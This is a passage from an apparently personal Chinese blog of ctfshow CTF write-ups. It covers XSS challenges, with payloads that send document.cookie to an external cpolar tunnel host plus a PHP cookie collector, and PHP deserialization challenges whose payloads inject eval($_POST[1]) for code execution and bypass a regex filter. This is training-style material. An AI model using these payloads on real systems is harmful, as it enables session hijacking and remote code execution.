        <content type="html"><![CDATA[<p><strong>其实XSS有很多语句的的，如果做题的时候被过滤了的话，可以在这篇文章下找，这篇文章就为了用来记录xss的payload的</strong></p><p><strong>XSS漏洞常见类型 反射型：交互的数据一般不会被存在数据库里面，一次性，所见即所得，一般出现在查询类页面；(需要别人去点击自己伪造的链接)    存储型：交互的数据会被存在数据库里面，永久性存储，一般出现在留言板、注册等页面；(管理员访问的时候就会自动执行)   DOM型：不与后台服务器产生数据交互，是一种通过DOM操作前段代码输出的时候产生的问题，一次性，也属于反射型。</strong></p><h2 id="web316-反射型"><a href="#web316-反射型" class="headerlink" title="web316(反射型)"></a>web316(反射型)</h2><p>这里由于懒得花钱去搞vps(当然也没去学咋搞…)所以这里就用一个内网渗透的工具去搞(cpolar)</p><p>具体怎么用可以自己去网上去找，很简单的  <a href="https://blog.51cto.com/u_13540373/5760290">点击这里，这篇文章可以教你如何操作</a></p><p>需要部署在本地的php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$flag</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>,<span class="variable">$flag</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>作用：<strong>就是接收get传递进来的参数，并写在flag.txt里</strong></p><p>因为我这里的php代码是放在phpstudy的www目录下，到时候直接去www目录下看就好了。</p><p><img src="../images/image-20230118143203368.png" alt="image-20230118143203368"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这里生成的网址的话，cpolar会自己给你随机生成的，到时候自己进行更换就好了。</p><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>题目</p><p><img src="../images/image-20230118143557955.png" alt="image-20230118143557955"></p><p><strong>过滤了script</strong></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230118143720453.png" alt="image-20230118143720453"></p><h2 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h2><p>题目</p><p><img src="../images/image-20230118143810781.png" alt="image-20230118143810781"></p><p><strong>过滤了img</strong></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h2><p>题目</p><p><img src="../images/image-20230118144111539.png" alt="image-20230118144111539"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="web320-326"><a href="#web320-326" class="headerlink" title="web320-326"></a>web320-326</h2><p>题目</p><p><img src="../images/image-20230118144333194.png" alt="image-20230118144333194"></p><p><strong>这都过滤了空格</strong></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=&quot;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="web327-存储型"><a href="#web327-存储型" class="headerlink" title="web327(存储型)"></a>web327(存储型)</h2><p>题目</p><p><img src="../images/image-20230118150350661.png" alt="image-20230118150350661"></p><p>收件人必须填admin，其他的可以随便填</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=&quot;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>源码</p><p><img src="../images/image-20230118150649147.png" alt="image-20230118150649147"></p><p>这个题比较绕，解法是先进行页面注册，把js代码注入后台，然后管理员访问的时候，就会触发js代码，把管理员的cookie返回到我们本地.</p><p>(这里就是利用注册的时候注册js代码，等管理员访问的时候就会触发代码，然后返回管理员的cookie)</p><p>这里的话<strong><body></strong>用不了</p><p>我们换成<script></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&#x27;http://33d37750.r7.cpolar.top/1.php?c=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230118152652575.png" alt="image-20230118152652575"></p><p>拿到了管理员的cookie值，那么我们进行抓包查看，因为我们单纯修改cookie的话，第一个页面会默认我们不是管理员，看不了flag，所以我们要抓另一个包。</p><p><img src="../images/image-20230118212607420.png" alt="image-20230118212607420"></p><p>成功拿到flag，抓包的时候要记得放掉第一个包，得抓第二个。</p><h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>题目</p><p><img src="../images/image-20230118212824093.png" alt="image-20230118212824093"></p><p>这道题的话是管理员cookie会一直在变，那么我们就不能利用管理员cookie登录了，那么我们就得换一个方法了。</p><p><img src="../images/image-20230118220105619.png" alt="image-20230118220105619"></p><p>拿到了存贮这个类的页面</p><p><img src="../images/image-20230118220134350.png" alt="image-20230118220134350"></p><p>那么我们就可以去遍历了，(这里利用的是前端的语句，我也不太会，没学过)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JS indexof 方法https://www.w3school.com.cn/jsref/jsref_indexOf.asp</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$(&#x27;.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;</span><br><span class="line">    if(value.innerHTML.indexOf(&#x27;ctfshow&#123;&#x27;)==0)&#123;</span><br><span class="line">        window.location.href=&#x27;http://33d37750.r7.cpolar.top/1.php?c=&#x27;+value.innerHTML; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230118220445638.png" alt="image-20230118220445638"></p><p>最后将上面的payload进行注册登录就能拿到flag了(这里是利用前端的语句来获取的)</p><h2 id="web330-GET"><a href="#web330-GET" class="headerlink" title="web330(GET)"></a>web330(GET)</h2><p>题目</p><p><img src="../images/image-20230118220652986.png" alt="image-20230118220652986"></p><p>这个多了个修改密码的功能(那肯定是拿这个修改密码来做文章了)</p><p>这里的思路是同过给管理员账户修改密码，然后通过新修改的密码登录管理员账户，然后拿到flag就ok了。</p><p>但是这里在哪触发script就很迷，经过测试，发现在用户名这里可以进行触发。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&#x27;http://127.0.0.1/api/change.php?p=123&#x27;;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这里的127.0.0.1是管理员的账户，后面的<code>/api/change.php?p=123</code>是修改密码时的页面，可以自己去抓个包看看。(这里就是把管理员的密码给修改为123)</p><p><strong>这里查看用户管理的时候要进行抓包查看，因为这个会一闪而过，看不了。</strong></p><h2 id="web331-POST"><a href="#web331-POST" class="headerlink" title="web331(POST)"></a>web331(POST)</h2><p>题目</p><p><img src="../images/image-20230118224424779.png" alt="image-20230118224424779"></p><p>还是这样子(还是通过修改管理员的密码这个方法来进行获取flag)</p><p>但是这里改成POST提交了，我们得换一下paylaod</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;http://127.0.0.1/api/change.php&#x27;,type:&#x27;post&#x27;,data:&#123;p:&#x27;123&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="web332-GET"><a href="#web332-GET" class="headerlink" title="web332(GET)"></a>web332(GET)</h2><p>题目</p><p><img src="../images/image-20230118225058977.png" alt="image-20230118225058977"></p><p>新增加了几个功能</p><p>思路</p><p>就是利用这里面的逻辑漏洞，就是想管理员账号转账-10000,然后自己就会加钱，转正的会减钱，可以自己去尝试。</p><p>然后转账成功就去买flag就行了。</p><h2 id="web333-POST"><a href="#web333-POST" class="headerlink" title="web333(POST)"></a>web333(POST)</h2><p>题目</p><p><img src="../images/image-20230118231027106.png" alt="image-20230118231027106"></p><p>这道题的话就不能去进行转账负金额了，(同时这里也修改成了POST)</p><p><strong>解法一</strong></p><p>这里的话是通过注册一个账号，然后给自己转账，只要金额不超过自身拥有的就行，那么我们的存款就可以增加，然后就可以买到flag了。</p><p><strong>解法二</strong></p><p><img src="../images/image-20230118232026586.png" alt="image-20230118232026586"></p><p>post包的内容变了，那么我们就去修改一下payload</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;http://127.0.0.1/api/amount.php&#x27;,type:&#x27;post&#x27;,data:&#123;u:&#x27;123&#x27;,a:&#x27;10000&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>​                 <strong>u是转账的账户名  a是转账的金额</strong></p><p>思路</p><p>(这道题的解法是通过管理员给自己转账，就是先自己注册一个账户，然后修改payload，把自己的用户名和需要转的金额加进去，然后在拿去注册，然后等管理员去访问管理页面，js代码就会执行，然后就会像我们自己的账户转钱，那么我们就登录我们自己的账户就可以看到转来的钱了，然后在拿去买flag就行了)</p><p>到此，xss搞一段落了</p><p>(其实还有很多<strong>XSS</strong>的框架没用到，以后做题的时候可以出搜来用用)</p>]]></content>
      
      
      
        <tags>
            
            <tag> XSS ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-反序列化 刷题记录</title>
      <link href="/posts/fd5983bb.html"/>
      <url>/posts/fd5983bb.html</url>
      
        <content type="html"><![CDATA[<h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><p>源码</p><p><img src="../images/image-20230104214414714.png" alt="image-20230104214414714"></p><p>这里没有魔术方法，因为魔术方法是下划线开头的  ——&gt;    __toString()  类似这种</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure><p>没用到反序列化的东西。</p><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><p>源码</p><p><img src="../images/image-20230104215011783.png" alt="image-20230104215011783"></p><p>这里用到了反序列的语句了，但魔术方法还是没有用到。</p><p>这题和上一题的不同是false无法自动变成true了，那么我们就得手动去变。</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>获取脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>()));</span><br></pre></td></tr></table></figure><p>这里面的话函数可以删去，这里也可以不用urlencode,用的原因是protected  private会产生不可见字符，如果用的话，就不管啥情况都可以过了。就不用担心不可见字符了。</p><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><p>源码</p><p><img src="../images/image-20230104220444891.png" alt="image-20230104220444891"></p><p>这里的话涉及到username和password的问题，既要相等又要不等，那么我们在反序列处是可以控制类里面的参数的值的</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>获取脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>()));</span><br></pre></td></tr></table></figure><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><p>源码</p><p><img src="../images/image-20230104221218372.png" alt="image-20230104221218372"></p><p>这里终于遇到了反序列化函数了   </p><p>这里介绍一下construct和destruct函数，学过c++语言的应该都知道这两个函数</p><p>construct —&gt;  就是在new 一个新的对象的时候会自动运行的函数，如果class类中没有的话，系统就会自己新创一个，但里面没有任何东西。</p><p>destruct —&gt;   就是在一个类运行结束的时候，会自动运行的函数。</p><p><strong><img src="../images/image-20230104222641078.png" alt="image-20230104222641078"></strong></p><p><img src="../images/image-20230104222655281.png" alt="image-20230104222655281"></p><p>就是先输出a,在输出b.</p><p>回到这道题</p><p>这里把__construct 函数里的info改成backDoor，因为在new一个ctfShowUser的新对象时，会自动执行construct函数。就会new一个backDoor的新对象，然后ctfShowUser类结束的时候会自动执行destruct函数，然后就会调用到backDoor类里边的getInfo函数，里面的函数有一个命令执行，然后就利用这一点进行rce了。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p>修改后的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br></pre></td></tr></table></figure><p>然后自己进行rce就行。</p><h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><p>源码</p><p><img src="../images/image-20230104223933413.png" alt="image-20230104223933413"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&#x27;/[oc]:\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))</span><br></pre></td></tr></table></figure><p>可以看对序列化的字符串进行了过滤，其实主要过滤的就是禁止<code>Object</code>类型被反序列化。虽然这样看起是没有问题的，但是由于PHP的一个BUG，导致仍然可以被绕过。只需要在对象长度前添加一个<code>+</code>号，即<code>o:14-&gt;o:+14</code>，这样就可以绕过正则匹配。</p><p>这个漏洞是php5.6.24版本才进行修复.</p><p>修复后—&gt;  <code>/[oc]:[^:]*\d+:/i</code>    这里的话用+已经不能绕过了。</p><p>第一步</p><p>（进行修改）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;ctfShowUser&quot;:4:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;isVip&quot;;b:0;s:5:&quot;class&quot;;O:8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:16:&quot;eval($_POST[1]);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>第二步</p><p>（urlencode)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p>修改后的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span 